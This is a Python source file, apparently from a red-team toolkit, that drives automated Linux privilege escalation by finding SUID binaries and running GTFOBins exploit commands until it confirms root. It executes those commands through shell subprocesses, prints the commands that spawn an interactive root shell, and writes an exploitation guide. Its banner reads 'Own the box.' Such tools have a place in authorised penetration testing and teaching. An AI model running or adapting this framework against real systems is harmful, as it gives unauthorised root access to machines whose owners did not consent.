"""
SUID Binary Exploiter
=====================

Main orchestrator for SUID binary discovery and exploitation.
"""

import os
import subprocess
import json
from pathlib import Path
from datetime import datetime
from typing import List, Optional, Dict, Any

from .gtfobins import GTFOBinsDB, ExploitType
from .binary import SUIDFinding, ExploitResult, ExploitStatus, SUIDScanResult
from .scanner import SUIDScanner


class SUIDExploiter:
    """
    Main SUID binary exploitation framework.

    Discovers SUID binaries and attempts automated exploitation
    using GTFOBins techniques.

    Usage:
        exploiter = SUIDExploiter()
        results = exploiter.scan_and_exploit()
        exploiter.save_report(results)
    """

    BANNER = '''
    ╔═══════════════════════════════════════════════════════════════╗
    ║     SUID Binary Exploitation Framework                        ║
    ║     Part of: 30 Days of Red Team Toolkit                      ║
    ║─────────────────────────────────────────────────────────────────║
    ║     "Find SUID. Exploit SUID. Own the box."                   ║
    ╚═══════════════════════════════════════════════════════════════╝
    '''

    def __init__(self, output_dir: Optional[str] = None, verbose: bool = False):
        """
        Initialize the exploiter.

        Args:
            output_dir: Directory for reports
            verbose: Enable verbose output
        """
        self.gtfobins = GTFOBinsDB()
        self.scanner = SUIDScanner(self.gtfobins)
        self.verbose = verbose

        self.output_dir = Path(output_dir) if output_dir else Path("/tmp/suid_exploit")
        self.output_dir.mkdir(exist_ok=True, mode=0o755)

        print(self.BANNER)
        print(f"[+] Loaded {len(self.gtfobins)} GTFOBins exploit techniques")
        print(f"[+] Output directory: {self.output_dir}")

    def scan(self, search_paths: Optional[List[str]] = None) -> SUIDScanResult:
        """
        Scan for SUID binaries without exploitation.

        Args:
            search_paths: Paths to search

        Returns:
            SUIDScanResult with categorized findings
        """
        print(f"\n{'=' * 60}")
        print("SUID BINARY ENUMERATION")
        print(f"{'=' * 60}")

        exploitable, unusual, standard = self.scanner.scan(search_paths)

        result = SUIDScanResult(
            all_binaries=exploitable + unusual + standard,
            exploitable=exploitable,
            unusual=unusual,
            standard=standard
        )

        result.print_summary()

        return result

    def exploit_binary(
            self,
            binary: SUIDFinding,
            test_only: bool = True
    ) -> ExploitResult:
        """
        Attempt to exploit a single SUID binary.

        Args:
            binary: The SUID binary to exploit
            test_only: If True, run 'id' instead of spawning shell

        Returns:
            ExploitResult indicating outcome
        """
        print(f"\n[*] Attempting exploitation: {binary.name}")
        print(f"[*] Path: {binary.path}")

        # Get exploitation techniques
        techniques = self.gtfobins.get(binary.name)

        if not techniques:
            print(f"[-] No known exploits for: {binary.name}")
            print(f"[*] Check: {binary.gtfobins_url}")

            return ExploitResult(
                binary=binary,
                technique="None",
                command="",
                status=ExploitStatus.UNTESTED,
                error="No known exploitation techniques"
            )

        # Try each technique
        for technique in techniques.techniques:
            print(f"\n[*] Trying: {technique.description}")

            # Use test command if available and test_only mode
            if test_only and technique.test_command:
                cmd = technique.test_command
                print(f"[*] Test command: {cmd}")
            elif not technique.interactive:
                cmd = technique.command
                print(f"[*] Command: {cmd}")
            else:
                print(f"[!] Requires interactive shell")
                print(f"[*] Manual command: {technique.command}")

                return ExploitResult(
                    binary=binary,
                    technique=technique.description,
                    command=technique.command,
                    status=ExploitStatus.INTERACTIVE
                )

            # Execute the exploit
            result = self._execute_exploit(binary, technique.description, cmd)

            if result.got_root:
                print(f"\n[+] SUCCESS! Achieved elevated privileges!")
                return result

        print(f"\n[-] Could not automatically exploit {binary.name}")
        print(f"[*] Try manual exploitation:")

        for tech in techniques.techniques:
            print(f"    {tech.command}")

        return ExploitResult(
            binary=binary,
            technique="All attempted",
            command="Multiple",
            status=ExploitStatus.FAILED
        )

    def _execute_exploit(
            self,
            binary: SUIDFinding,
            technique: str,
            command: str
    ) -> ExploitResult:
        """Execute an exploitation command and check results"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )

            output = result.stdout + result.stderr

            # Check if we got root
            got_root = 'uid=0' in output or 'euid=0' in output

            if got_root:
                status = ExploitStatus.SUCCESS
            elif result.returncode == 0:
                status = ExploitStatus.FAILED
            else:
                status = ExploitStatus.FAILED

            print(f"[*] Output: {output[:200]}")

            return ExploitResult(
                binary=binary,
                technique=technique,
                command=command,
                status=status,
                output=output,
                got_root=got_root
            )

        except subprocess.TimeoutExpired:
            return ExploitResult(
                binary=binary,
                technique=technique,
                command=command,
                status=ExploitStatus.ERROR,
                error="Command timed out"
            )
        except Exception as e:
            return ExploitResult(
                binary=binary,
                technique=technique,
                command=command,
                status=ExploitStatus.ERROR,
                error=str(e)
            )

    def scan_and_exploit(
            self,
            test_only: bool = True,
            stop_on_success: bool = True
    ) -> SUIDScanResult:
        """
        Scan for SUID binaries and attempt exploitation.

        Args:
            test_only: Run test commands instead of spawning shells
            stop_on_success: Stop after first successful exploit

        Returns:
            SUIDScanResult with exploitation results
        """
        print(f"\n{'=' * 60}")
        print("AUTOMATED SUID EXPLOITATION")
        print(f"{'=' * 60}")

        # Scan first
        result = self.scan()

        if not result.exploitable:
            print(f"\n[-] No exploitable SUID binaries found")
            return result

        # Attempt exploitation
        print(f"\n{'=' * 60}")
        print("EXPLOITATION PHASE")
        print(f"{'=' * 60}")

        for binary in result.exploitable:
            exploit_result = self.exploit_binary(binary, test_only)
            result.exploit_results.append(exploit_result)

            if exploit_result.got_root and stop_on_success:
                print(f"\n[+] ROOT ACHIEVED via {binary.name}!")
                print(f"[*] To get an interactive shell, run:")

                techniques = self.gtfobins.get(binary.name)
                if techniques:
                    for tech in techniques.techniques:
                        if tech.exploit_type == ExploitType.SHELL:
                            print(f"    {tech.command}")

                break

        return result

    def exploit_specific(
            self,
            binary_name: str,
            binary_path: Optional[str] = None,
            test_only: bool = True
    ) -> ExploitResult:
        """
        Exploit a specific binary by name.

        Args:
            binary_name: Name of the binary (e.g., 'find', 'vim')
            binary_path: Full path (auto-detected if not provided)
            test_only: Run test command instead of shell

        Returns:
            ExploitResult
        """
        print(f"\n{'=' * 60}")
        print(f"EXPLOITING: {binary_name}")
        print(f"{'=' * 60}")

        # Find the binary
        if not binary_path:
            finding = self.scanner.quick_check(binary_name)

            if not finding:
                print(f"[-] {binary_name} not found or not SUID")
                return ExploitResult(
                    binary=SUIDFinding(path="", name=binary_name),
                    technique="N/A",
                    command="",
                    status=ExploitStatus.ERROR,
                    error="Binary not found or not SUID"
                )
        else:
            finding = SUIDFinding(
                path=binary_path,
                name=binary_name,
                is_exploitable=self.gtfobins.has(binary_name)
            )

        return self.exploit_binary(finding, test_only)

    def save_report(self, result: SUIDScanResult, filename: str = "suid_report.json") -> Path:
        """
        Save scan/exploit results to JSON.

        Args:
            result: SUIDScanResult to save
            filename: Output filename

        Returns:
            Path to saved file
        """
        report_path = self.output_dir / filename

        with open(report_path, 'w') as f:
            json.dump(result.to_dict(), f, indent=2)

        print(f"\n[+] Report saved: {report_path}")

        return report_path

    def generate_exploit_guide(self, result: SUIDScanResult) -> Path:
        """
        Generate a quick exploitation guide.

        Args:
            result: SUIDScanResult with findings

        Returns:
            Path to guide file
        """
        guide_path = self.output_dir / "exploit_guide.txt"

        with open(guide_path, 'w') as f:
            f.write("SUID EXPLOITATION GUIDE\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

            if result.exploitable:
                f.write("EXPLOITABLE BINARIES\n")
                f.write("-" * 60 + "\n\n")

                for binary in result.exploitable:
                    f.write(f"[{binary.name}] {binary.path}\n")
                    f.write(f"GTFOBins: {binary.gtfobins_url}\n")

                    techniques = self.gtfobins.get(binary.name)
                    if techniques:
                        f.write("Commands:\n")
                        for tech in techniques.techniques:
                            f.write(f"  {tech.command}\n")

                    f.write("\n")

            if result.unusual:
                f.write("\nUNUSUAL BINARIES (Investigate)\n")
                f.write("-" * 60 + "\n\n")

                for binary in result.unusual:
                    f.write(f"{binary.path}\n")
                    f.write(f"  Owner: {binary.owner_name}\n")
                    f.write(f"  Type: {binary.file_type}\n\n")

        print(f"[+] Exploit guide saved: {guide_path}")

        return guide_path

    def list_techniques(self, binary_name: str) -> None:
        """
        List all exploitation techniques for a binary.

        Args:
            binary_name: Name of the binary
        """
        techniques = self.gtfobins.get(binary_name)

        if not techniques:
            print(f"[-] No techniques found for: {binary_name}")
            print(f"[*] Check: https://gtfobins.github.io/gtfobins/{binary_name}/")
            return

        print(f"\n{'=' * 60}")
        print(f"TECHNIQUES FOR: {binary_name}")
        print(f"{'=' * 60}")
        print(f"GTFOBins: {techniques.url}")

        if techniques.notes:
            print(f"Notes: {techniques.notes}")

        for i, tech in enumerate(techniques.techniques, 1):
            print(f"\n[{i}] {tech.description}")
            print(f"    Type: {tech.exploit_type.value}")
            print(f"    Command: {tech.command}")

            if tech.interactive:
                print(f"    ⚠ Requires interactive terminal")